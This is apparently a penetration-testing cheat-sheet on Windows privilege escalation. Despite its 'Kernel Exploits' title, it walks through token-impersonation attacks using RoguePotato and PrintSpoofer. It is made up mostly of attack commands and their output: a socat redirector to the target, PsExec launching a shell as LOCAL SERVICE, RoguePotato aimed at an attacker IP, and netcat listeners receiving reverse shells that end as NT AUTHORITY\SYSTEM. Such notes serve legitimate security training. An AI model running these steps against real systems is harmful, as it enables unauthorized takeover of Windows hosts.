# Kernel Exploits

## 01 - Manual

### 1.1 - Enumerate

When discovering an outdated windows system. Exploiting may come to a great risk to perform a system that might crash since the kernel is required to function the whole operating system which is part of the core components. This is a last resort to perform the privilege escalation so choose the following vulnerabilities and don't overdo it. Refer to the **Auditing Tools** section

`C:\> wmic qfe get Caption,Description,HotFixID,InstalledOn`

### 1.2 - RoguePotato

Start with a redirector using `socat` then check if `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` is enabled

```
$ sudo socat tcp-listen:135,reuseaddr,fork tcp:<target_IP>:9999

C:\Windows\system32> whoami
win-qba94kb3iof\admin

C:\Windows\system32> whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
..[snip]..
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
..[snip]..
```

Start a shell handler before running `PsExec64.exe` as in `NT AUTHORITY\LOCAL SERVICE` to receive a callback shell.

```
C:\Windows\system32> cd c:\Tools

C:\Tools> PsExec64.exe -i -u "nt authority\local service" c:\Tools\shell.exe

$ sudo nc -lnvp 53
C:\Windows\system32> whoami
nt authority\local service

C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
..[snip]..
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
..[snip]..

C:\Windows\system32> cd c:\Tools

C:\Tools> RoguePotato.exe -r <attacker_IP> -e shell.exe -l 9999
[+] Starting RoguePotato...
[*] Creating Rogue OXID resolver thread
[*] Creating Pipe Server thread..
[*] Creating TriggerDCOM thread...
[*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client to connect
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ...
[*] Calling CoGetInstanceFromIStorage with CLSID:{4991d34b-80a1-4291-83b6-3328366b9097}
[*] IStoragetrigger written:106 bytes
[*] SecurityCallback RPC call
[*] ServerAlive2 RPC Call
[*] SecurityCallback RPC call
[*] ResolveOxid2 RPC call, this is for us!
[*] ResolveOxid2: returned endpoint binding information = ncacn_np:localhost/pipe/RoguePotato[\pipe\epmapper]
[*] Client connected!
[+] Got SYSTEM Token!!!
[*] Token has SE_ASSIGN_PRIMARY_NAME, using CreateProcessAsUser() for launching: shell.exe
[+] RoguePotato gave you the SYSTEM powerz :D

$ sudo nc -lnvp 53
C:\Tools> whoami
nt authority\system
```

### 1.3 - PrintSpoofer

```
C:\Tools> PsExec64.exe -i -u "nt authority\local service" c:\Tools\shell.exe

$ sudo nc -lnvp 53
C:\Windows\system32> whoami
nt authority\local service

C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
..[snip]..
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
..[snip]..

C:\Windows\system32> cd c:\Tools

C:\Tools> PrintSpoofer.exe -c shell.exe -i
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK

$ sudo nc -lnvp 53
C:\Windows\system32> whoami
nt authority\system
```

## References

- [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)

- [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)

- [Potatoes Windows Privilege Escalation](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)

- [Windows Privilege Escalation SeImpersonatePrivilege](https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/)

- [Abusing SeImpersonatePrivilege On Users to Become System](https://shreyapohekar.com/blogs/abusing-seimpersonateprivilege-on-users-to-become-system/)